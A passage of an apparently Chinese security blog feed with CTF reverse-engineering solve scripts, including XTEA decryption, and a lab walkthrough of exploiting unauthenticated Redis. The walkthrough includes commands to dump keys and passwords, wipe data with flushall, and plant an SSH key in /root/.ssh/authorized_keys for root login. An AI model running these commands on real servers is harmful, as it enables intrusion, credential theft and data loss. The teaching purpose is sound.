0x00F11528, 0x0000002D, 0x00F0A638, 0x00000051, 0x00F117E0, 0x00000013, 0x00F09200, 0x00000074, 0x00F102E0, 0x0000007B, 0x00F0DF90, 0x0000006E, 0x00F098A0, 0x00000055, 0x00F0D6A0, 0x00000059, 0x00F0F9C8, 0x00000043, 0x00F0B8F0, 0x00000006, 0x00F10D08, 0x00000041, 0x00F0D7B0, 0x0000004A, 0x00F12BA0, 0x00000049, 0x00F097B0, 0x00000006, 0x00F0EB58, 0x00000041, 0x00F0D658, 0x00000030, 0x00F0C030, 0x00000074, 0x00F12490, 0x00000011, 0x00F0E080, 0x00000073, 0x00F0C9B0, 0x0000003A, 0x00F11FF0, 0x0000000D, 0x00F0FDA8, 0x00000012, 0x00F0C800, 0x00000038, 0x00F0DC18, 0x00000046, 0x00F0BAF8, 0x0000002A, 0x00F0AC78, 0x00000067, 0x00F0FFC0, 0x0000006B, 0x00F0B5A8, 0x0000005F, 0x00F12838, 0x00000036, 0x00F09A20, 0x0000003F, 0x00F10CF8, 0x00000046, 0x00F0E8C8, 0x00000062, 0x00F0E2C8, 0x0000001D, 0x00F10FD8, 0x00000001, 0x00F121A0, 0x0000004B, 0x00F0AA00, 0x00000032, 0x00F0C960, 0x00000018, 0x00F0F900, 0x0000005E, 0x00F11170, 0x00000067, 0x00F0FA88, 0x0000002B, 0x00F0F610, 0x00000007, 0x00F0C910, 0x00000005, 0x00F09B50, 0x0000002E, 0x00F0EEE8, 0x00000015, 0x00F0A898, 0x0000000E, 0x00F0BF70, 0x00000071, 0x00F10108, 0x00000027, 0x00F11BC8, 0x0000004B, 0x00F098B8, 0x00000031, 0x00F0F198, 0x00000060, 0x00F0CF78, 0x00000053, 0x00F0ED78, 0x0000007E, 0x00F0A138, 0x0000001C, 0x00F0C120, 0x0000005A, 0x00F0C5E8, 0x0000003E, 0x00F0B468, 0x00000010, 0x00F0AF28, 0x00000018, 0x00F0C808, 0x0000006D, 0x00F11900, 0x00000036, 0x00F113A0, 0x0000001A, 0x00F0B8B8, 0x0000000B, 0x00F12370, 0x00000077, 0x00F0D580, 0x00000031, 0x00F0E590, 0x00000008, 0x00F0D800, 0x00000019, 0x00F12050, 0x00000014, 0x00F0D310, 0x00000033, 0x00F0A708, 0x00000061, 0x00F119F8, 0x00000004, 0x00F09E08, 0x0000003C, 0x00F12B30, 0x00000077, 0x00F0AC38, 0x00000023, 0x00F0A2F0, 0x00000000, 0x00F100D8, 0x00000062, 0x00F0E650, 0x00000020, 0x00F0F220, 0x00000044, 0x00F0CA60, 0x00000043, 0x00F0AB58, 0x00000058, 0x00F096E8, 0x00000013, 0x00F0CBB0, 0x00000056, 0x00F0C758, 0x00000032, 0x00F11288, 0x00000031, 0x00F0EC20, 0x00000072, 0x00F0A600, 0x00000046, 0x00F0B558, 0x00000023, 0x00F0EA80, 0x00000057, 0x00F0DF88, 0x00000038, 0x00F104B0, 0x0000003A, 0x00F10828, 0x00000049, 0x00F0EB00, 0x00000043, 0x00F09A78, 0x00000065, 0x00F0DC58, 0x00000018, 0x00F0E048, 0x00000043, 0x00F12768, 0x00000040, 0x00F0D8F8, 0x00000069, 0x00F0AFA0, 0x00000024, 0x00F0AA08, 0x00000038, 0x00F0DCF0, 0x00000069, 0x00F11BF0, 0x0000000B, 0x00F104D8, 0x00000042, 0x00F107E0, 0x0000002E, 0x00F0CAB8, 0x00000032, 0x00F0DD28, 0x00000013, 0x00F0B120, 0x00000053, 0x00F11798, 0x00000067, 0x00F0F2C0, 0x0000001D, 0x00F0FD80, 0x00000073, 0x00F0A498, 0x0000003E, 0x00F0AC38, 0x00000073, 0x00F0AFA0, 0x00000009, 0x00F0C078, 0x00000033, 0x00F0A020, 0x00000006, 0x00F0C8C8, 0x00000054, 0x00F0FD98, 0x00000021, 0x00F10BC0, 0x00000054, 0x00F11888, 0x00000014, 0x00F0D348, 0x00000048, 0x00F104C0, 0x00000074, 0x00F0E458, 0x00000078, 0x00F0DBC0, 0x00000019, 0x00F0E0C0, 0x00000034, 0x00F0FAD8, 0x00000023, 0x00F111E0, 0x0000001A, 0x00F10818, 0x00000003, 0x00F0D830, 0x00000029, 0x00F11840, 0x0000002A, 0x00F0CAA8, 0x0000005E, 0x00F0D930, 0x00000030, 0x00F11B60, 0x00000014, 0x00F11270, 0x0000005D, 0x00F0A648, 0x00000013, 0x00F11060, 0x0000001E, 0x00F0A2D8, 0x00000079, 0x00F0D188, 0x00000070, 0x00F0E610, 0x0000004B, 0x00F0D250, 0x00000054, 0x00F0CF18, 0x00000072, 0x00F0F8C8, 0x00000030, 0x00F0ECE0, 0x0000000E, 0x00F10BD0, 0x00000063, 0x00F0FF68, 0x00000024, 0x00F0E488, 0x0000004D, 0x00F0A200, 0x00000038, 0x00F0E210, 0x0000000B, 0x00F0E150, 0x0000006E, 0x00F10148, 0x0000004D, 0x00F11E10, 0x00000074, 0x00F10318, 0x0000006C, 0x00F0C188, 0x00000037, 0x00F0C620, 0x0000001E, 0x00F0F358, 0x0000004F, 0x00F0AC10, 0x0000007D, 0x00F0EC68, 0x0000004F, 0x00F0D350, 0x00000049, 0x00F11A38, 0x00000071, 0x00F09FD0, 0x00000000, 0x00F0C2A8, 0x00000008, 0x00F0D5B8, 0x00000040, 0x00F0BE00, 0x00000000, 0x00F0C5C0, 0x0000001E, 0x00F0EE90, 0x00000042, 0x00F11910, 0x0000004B, 0x00F0B850, 0x0000000D, 0x00F0EEF0, 0x00000035, 0x00F118A0, 0x00000052, 0x00F12300, 0x00000023, 0x00F0F768, 0x00000033, 0x00F10408, 0x00000036, 0x00F0F168, 0x0000005F, 0x00F0A570, 0x0000001B, 0x00F0FC70, 0x0000004D, 0x00F0B290, 0x0000001D, 0x00F0EFE8, 0x0000005F, 0x00F10210, 0x00000075, 0x00F0B2B0, 0x00000055, 0x00F0BC80, 0x0000001D, 0x00F11928, 0x00000057, 0x00F11F58, 0x00000053, 0x00F0F850]</span><br><span class=\"line\">base = 0xF09078</span><br><span class=\"line\">def dfs(array, node, path, depth):</span><br><span class=\"line\">    if depth == 48:</span><br><span class=\"line\">        print(path)</span><br><span class=\"line\">        result.append(path)</span><br><span class=\"line\">        return</span><br><span class=\"line\">    if depth &gt; 48:</span><br><span class=\"line\">        return</span><br><span class=\"line\">    for i in string.ascii_letters+string.digits+&quot;_!~@&quot;:</span><br><span class=\"line\">        i = ord(i)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            if i == (array[2*(i+node)]+5) or i == (array[2*(i+node)]-5):</span><br><span class=\"line\">                neighbor = (array[2*(i+node)+1] - base) // 8</span><br><span class=\"line\">                dfs(array, neighbor, path + chr(i), depth + 1)</span><br><span class=\"line\">        except IndexError:</span><br><span class=\"line\">            return</span><br><span class=\"line\">result = []</span><br><span class=\"line\">dfs(data, 0, &quot;&quot;, 0)</span><br><span class=\"line\"># Somet1mes_ch0ice_i5_more_import@nt_tHan_effort~!</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"babycpp\"><a class=\"anchor\" href=\"#babycpp\">#</a> Babycpp</h4>\n<p>数据输入后，经过魔改 Tea 加密和 RC4 加密后，与 cipher 进行对比</p>\n<p>Tea 加密由 (std::for_each&lt;unsigned long *,main::{lambda (unsigned long<br />\n&amp;)#1}&gt;)(v21, v16_str, v16_str + 4i64 * v15_0c, v10); 进入</p>\n<p>void **fastcall main::{lambda(unsigned long &amp;)#1}::operator()(**int64<br />\n**a1, __int64<br />\na2) 进行密钥的赋值，接着进行在 text_79 中进行 delate 赋值并进行加密</p>\n<p>**int64 **fastcall a43ff4190df3b6eee1d76b074c6c98d7::unknown9(unsigned<br />\nlong *)::{lambda (void)#1}::operator () 最终的加密在该函数中进行</p>\n<p>加密后 b63a8f7f7e4797a753840481428f0f18::unknown11 (v12, v11); 进行 rc4 加密</p>\n<p>**int64 **fastcall<br />\nb63a8f7f7e4797a753840481428f0f18::unknown11(std::vector <code>&lt;unsigned char&gt;</code> <br />\n&amp;)::{lambda (unsigned char &amp;)#1}::operator () 进行主要的加密操作</p>\n<p>此部分直接动调 S_boxss</p>\n<p>最终脚本如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def xtea_decrypt(rounds, block, key):</span><br><span class=\"line\"></span><br><span class=\"line\">  v0, v1 = block</span><br><span class=\"line\"></span><br><span class=\"line\">  delta = 0xDEADBEEF</span><br><span class=\"line\"></span><br><span class=\"line\">  total = delta * rounds</span><br><span class=\"line\"></span><br><span class=\"line\">  for _ in range(rounds):</span><br><span class=\"line\"></span><br><span class=\"line\">    v1 = (v1 - (((v0 &lt;&lt; 4 ^ v0 &gt;&gt; 5) + v0) ^ (total + key[(total&gt;&gt;11) &amp; 3]))) &amp; 0xFFFFFFFF</span><br><span class=\"line\"></span><br><span class=\"line\">    total = (total - delta) &amp; 0xFFFFFFFF</span><br><span class=\"line\"></span><br><span class=\"line\">    v0 = (v0 - (((v1 &lt;&lt; 4 ^ v1 &gt;&gt; 5) + v1) ^ (total + key[total &amp; 3]))) &amp; 0xFFFFFFFF</span><br><span class=\"line\"></span><br><span class=\"line\">  return v0, v1</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">def adjust_value(val):</span><br><span class=\"line\"></span><br><span class=\"line\">  return val if val &gt;= 0 else 256 + val</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">def merge_data(data):</span><br><span class=\"line\"></span><br><span class=\"line\">  return data[0] | (data[1] &lt;&lt; 8) | (data[2] &lt;&lt; 16) | (data[3] &lt;&lt; 24)</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">def process_data(cipher, Xor, add, st):</span><br><span class=\"line\"></span><br><span class=\"line\">  modified_data = [(adjust_value(cipher[i] ^ Xor[i]) - add[i]) ^ st[i] for i in range(50)]</span><br><span class=\"line\"></span><br><span class=\"line\">  return [merge_data(modified_data[i*4:(i+1)*4]) for i in range(12)]</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">def perform_decryption():</span><br><span class=\"line\"></span><br><span class=\"line\">  key = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476]</span><br><span class=\"line\"></span><br><span class=\"line\">  num_rounds = 0x100</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">  cipher = [0x33, 0xB2, 0x49, 0x8C, 0x39, 0xDD, 0x60, 0x5F, 0x5F, 0x77, 0x72, 0xAB, 0x38, 0xD9, 0xED, 0xE7, 0xF3, 0xF0, 0x66, 0x67, 0x16, 0xC8, 0x53, 0x80, 0x71, 0xB2, 0xFA, 0x5E, 0x7C, 0x2B, 0xBB, 0x0B, 0xE5, 0x88, 0x82, 0x0B, 0x06, 0x8C, 0x8D, 0xAD, 0x47, 0xB5, 0x85, 0xBB, 0x06, 0x8D, 0x01, 0x2B] </span><br><span class=\"line\"></span><br><span class=\"line\">  Xor = [0xee, 0x17, 0x80, 0xe3, 0x17, 0xa, 0xe5, 0x53, 0x33, 0x9e, 0x2e, 0x1d, 0x5, 0x6f, 0xb4, 0x51, 0x9a, 0x36, 0x5c, 0xbd, 0x8, 0xa2, 0x34, 0xa3, 0x65, 0x59, 0x62, 0xae, 0x34, 0xd, 0xd0, 0xbc, 0x30, 0x81, 0xeb, 0x8c, 0x65, 0x36, 0xfd, 0x7e, 0x4a, 0x1e, 0x10, 0x27, 0xdd, 0x5a, 0xa4, 0xb]    </span><br><span class=\"line\"></span><br><span class=\"line\">  add = [0x56, 0x2d, 0xf8, 0x42, 0x7f, 0xc2, 0x26, 0x63, 0x83, 0x32, 0xc4, 0x3f, 0xb9, 0xa8, 0x7f, 0xc9, 0x43, 0x22, 0xc6, 0x89, 0x6b, 0x5d, 0xef, 0x2e, 0xe8, 0x20, 0xcd, 0xbf, 0x84, 0xf0, 0x7b, 0x4d, 0xd2, 0x3f, 0x4f, 0xb7, 0x95, 0xf0, 0xcd, 0x96, 0x57, 0x56, 0x43, 0xf1, 0x6b, 0x1, 0xc6, 0x36] </span><br><span class=\"line\"></span><br><span class=\"line\">  st = [0x3b, 0x3b, 0x3e, 0xe8, 0x2c, 0x72, 0x2e, 0xc7, 0xc7, 0xde, 0x12, 0xd1, 0x91, 0x34, 0x61, 0x59, 0x1d, 0x13, 0x81, 0xd4, 0x87, 0x67, 0xeb, 0x73, 0x7c, 0x58, 0xa4, 0x6a, 0x98, 0x97, 0x1f, 0x83, 0x2d, 0xa3, 0x90, 0x76, 0xdb, 0xf0, 0x18, 0x89, 0x8d, 0xe2, 0xa7, 0x2e, 0x44, 0xbc, 0x4c, 0x6c]  </span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">  final_data = process_data(cipher, Xor, add, st)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">  for i in range(0, 12, 2):</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypted_block = xtea_decrypt(num_rounds, final_data[i:i+2], key)</span><br><span class=\"line\"></span><br><span class=\"line\">    print(f&quot;Decrypted Block &#123;i//2&#125;: &#123;decrypted_block&#125;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">perform_decryption()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"数据安全\"><a class=\"anchor\" href=\"#数据安全\">#</a> 数据安全</h3>\n<h4 id=\"cyan-1\"><a class=\"anchor\" href=\"#cyan-1\">#</a> Cyan-1</h4>\n<p>注册后做题就行了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1706620684161-7a964022-5591-410c-8080-c58a91dfc5f7.png\" alt=\"\" /></p>\n",
            "tags": [
                "MISC",
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/",
            "url": "https://nnnpc.github.io/2024/04/16/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/",
            "title": "未授权访问漏洞",
            "date_published": "2024-04-16T05:58:19.057Z",
            "content_html": "<blockquote>\n<p>未授权访问漏洞可以理解为安全配置、权限认证、授权页面存在缺陷，导致其他用户可以直接访问，从而引发权限可被操作，数据库、网站目录等敏感信息泄露。目前存在未授权访问漏洞的主要服务包括：NFS、Samba、LDAP、Rsync、FTP、GitLab、Jenkins、MongoDB、Redis、ZooKeeper、ElasticSearch、Memcache、CouchDB、Docker、Solr、Hadoop 等，使用时要注意。</p>\n</blockquote>\n<p><strong>Redis 未授权访问漏洞</strong></p>\n<blockquote>\n<p>Redis 是一种使用 ANSIC 语言编写的开源 Key-Value 型数据库。与 Memcache 相似，支持存储的 value 类型有很多种，其中包括 String（字符串）、List（链表）、Set（集合）、Zste（有序集合）、Hash（哈希）等。同时，Redis 还支持不同的排序方式。Redis 为了保证效率，将数据缓存在内存中，周期性地把更新的数据写入磁盘或者把修改操作写入追加的记录文件中，，在此基础上实现主从同步。</p>\n</blockquote>\n<p>对 Redis 配置不当将会导致未授权访问漏洞，，从而被攻击者恶意利用。在特定条件下，如果 Redis 以 root 身份运行，攻击者可以用 root 权限的身份写入 SSH 公钥文件，通过 SSH 登录目标服务器。流程如下：</p>\n<blockquote>\n<p>密钥验证登录客户端生成公钥和私钥，将公钥提前部署在服务器上。<br />\n客户端发起连接请求。<br />\n服务器随机生成一个字符串，用本地的公钥加密，发送给客户端。<br />\n客户端通过私钥解密，将解密后的字符串发送给服务器。<br />\n服务器验证本地字符串和客户端发来的字符串的一致性，如果通过，则认证成功。</p>\n</blockquote>\n<p>进而会导致服务器权限被获取、泄露或发生加密勒索事件，为正常服务带来严重危害。通常，服务器上的 Redis 绑定在 0.0.0.0:6379，如果没有开启认证功能，且没有采用相关的安全策略，比如添加防火墙规则避免其他非信任来源 IP 访问等，将会导致 Redis 服务直接暴露在公网上，造成其他用户直接在非授权情况下访问 Redis 服务。</p>\n<p>通过手工进行未授权访问验证，在安装 Redis 服务的 Kali 系统中输入</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli-h IP</span><br></pre></td></tr></table></figure></p>\n<p>如果目标系统存在未授权访问漏洞，则可以成功进行连接。输入 info 命令，可以查看 Redis 服务的版本号、配置文件目录、进程 ID 号等<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ocG69JSA982uSTiK.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p><strong>漏洞利用</strong></p>\n<p>当与远程 Redis 建立好连接后，通过 Redis 指令就能查询所需要的敏感信息。下面就 Redis 一些常用指令进行简单介绍：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查看key和其对应的值：keys *</span><br><span class=\"line\">获取用户名：get user</span><br><span class=\"line\">获取登录指令：get password</span><br><span class=\"line\">删除所有数据：flushall</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PwhMm1LB8LN6UmBp.png!thumbnail\" alt=\"\" /></p>\n<p>如果 redis 拥有 root 权限，那么攻击者就可以将自己的公钥写入目标服务器的<br />\n /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以直接登录目标服务器。</p>\n<p>接下来就拉取镜像实现 ssh 登录</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker pull medicean/vulapps:r_redis_1</span><br></pre></td></tr></table></figure></p>\n<p>拉取 docker 镜像，并且启动环境</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run --name=redisvul -d -p 22:22 -p 6379:6379 medicean/vulapps:r_redis_1</span><br></pre></td></tr></table></figure></p>\n<p>这里由于是 docker 中的镜像，因此只能使用这一台机子来作为攻击机，因为 docker 中生成的一个虚拟网卡只能本机来进行访问，其他机子访问不了，既然本机作为攻击机，就先查看下本机的 ip</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ifconfig</span><br></pre></td></tr></table></figure></p>\n<p>再查看下 docker 中该容器的 ID<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QbG2DLhu7m9Y4wAk.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>这里查看到我的容器 ID 为 9a4fe89bc623，接下来查看 docker 的 ip，通过命令</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker exec -it 容器id /bin/bash</span><br></pre></td></tr></table></figure></p>\n<p>进入 docker，通过</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /etc/hosts</span><br></pre></td></tr></table></figure></p>\n<p>来查看 ip<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4FyPW0dj99ZAYTzU.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>这样攻击机和靶机的 ip 都知道了，接着就是利用 redis 未授权访问漏洞写入公钥进行连接了</p>\n<p>先同样测试一下 redis</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -h IP</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/F0hXSvvwMrcrZxf1.png!thumbnail\" alt=\"\" /></p>\n<p>redis 未授权证明成功，接下来本地生成公钥进行传输</p>\n<p>（建议接下来全程用 root 用户操作，能够减少权限不够的报错）</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kTm65oT3FRsBJWTV.png!thumbnail\" alt=\"\" /></p>\n<p>三个问题直接回车就好，overwrite 是因为我之前进行生成过，询问是否覆盖，公钥生成完毕，将生成的公钥的值写入目标机当中</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(echo -e &quot;\\n\\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; /tmp/foo.txt</span><br><span class=\"line\">cat /tmp/foo.txt | redis-cli -h IP -p 6379 -x set crackit</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/T7LD5oTxTELJf35U.png!thumbnail\" alt=\"\" /></p>\n<p>连接目标</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -h IP -p 6379 </span><br></pre></td></tr></table></figure></p>\n<p>设置（更改）目录为 /root/.ssh，并将备份文件名设置为 authorized_keys</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">config set dir /root/.ssh/</span><br><span class=\"line\">config get dir</span><br><span class=\"line\">config set dbfilename &quot;authorized_keys&quot;</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/F1MA04PS1eh63Dly.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>最后利用私钥通过 ssh 连接目标</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh root@IP -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IX6kmiuiSQKe4Z30.png!thumbnail\" alt=\"\" /></p>\n<p>连接成功，同样的命令 cat /etc/hosts 查看 ip</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yhbUrod9FGqXnCnE.png!thumbnail\" alt=\"\" /></p>\n<p>能看到成功 getshell 并且是 root 权限</p>\n<p>这里提一嘴，如果是用两台机子也可以，但有可能会出现虽然能对拉镜像的机子进行 redis 的连接，并且成功写入，但是 ssh 连不上的情况。这是因为 22 端口没进行映射，6379 端口是自动进行映射了，所以到最后一步 ssh 连接才会不成功</p>\n<p>接下来介绍怎么通过 python 脚本批量检测 redis 未授权访问漏洞</p>\n<p>先编写起始部分，类似于 C 语言中的 main () 函数，执行过程中没有发生异常时，执行定义的 start () 函数。通过 sys.argv [] 实现对外部指令的接收。其中，sys.argv [0] 代表代码本身的文件路径，sys.argv [1:] 表示从第一个命令行参数到输入的最后一个命令行参数，存储形式为 List 类型：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">        try:</span><br><span class=\"line\">                start(sys.argv[1:])</span><br><span class=\"line\">        except KeyboardInterrupt:</span><br><span class=\"line\">                print(&quot;interrupted by user,killing all threads...&quot;)</span><br></pre></td></tr></table></figure></p>\n<p>编写命令行参数处理功能。此处主要应用 getopt.getopt () 函数处理命令行参数，该函数目前有短选项和长选项两种格式。短选项格式为 &quot;-&quot; 加上单个字母选项；长选项格式为 &quot;--&quot; 加上一个单词选项。opts 为一个两元组列表，每个元素为（选项串，附加参数）。如果没有附加参数则为空串。之后通过 for 循环输出 opts 列表中的数值并赋值给自己定义的变量：<br />\n接下来部分主要用于输出帮助信息，增加代码工具的可读性和易用性。为了使输出的信息更加美观简洁，可以通过转义字符设置输出字体的颜色，从而实现需要的效果。开头部分包含三个参数：显示方式、前景色、背景色。这三个参数是可选的，可以只写其中的某一个参数。对于结尾部分，可以省略，但是为了书写规范，建议以 \\033 [0m 结尾</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># banner信息</span><br><span class=\"line\">def banner():</span><br><span class=\"line\">    print(&#x27;\\033[1;34m#################################################\\033[1;32mTT_xxxxx\\033[&#x27;</span><br><span class=\"line\">          &#x27;1;34m##############################################################\\033[0m\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 使用规则</span><br><span class=\"line\">    def usage():</span><br><span class=\"line\">        print(&#x27;-h: --help 帮助;&#x27;)</span><br><span class=\"line\">        print(&#x27;-p: --port 端口;&#x27;)</span><br><span class=\"line\">        print(&#x27;-u: --url 域名;&#x27;)</span><br><span class=\"line\">        print(&#x27;-s: --type Redis&#x27;)</span><br><span class=\"line\">        sys.exit()</span><br></pre></td></tr></table></figure></p>\n<p>输出有关该脚本用法的帮助信息，即可执行的参数指令以及对应的功能简介。当然，此处也可以根据自己的喜好设置输出不同类型的字体颜色或者图案</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def start(argv):</span><br><span class=\"line\">    thread = 1</span><br><span class=\"line\">    dict = &#123;&#125;</span><br><span class=\"line\">    utl 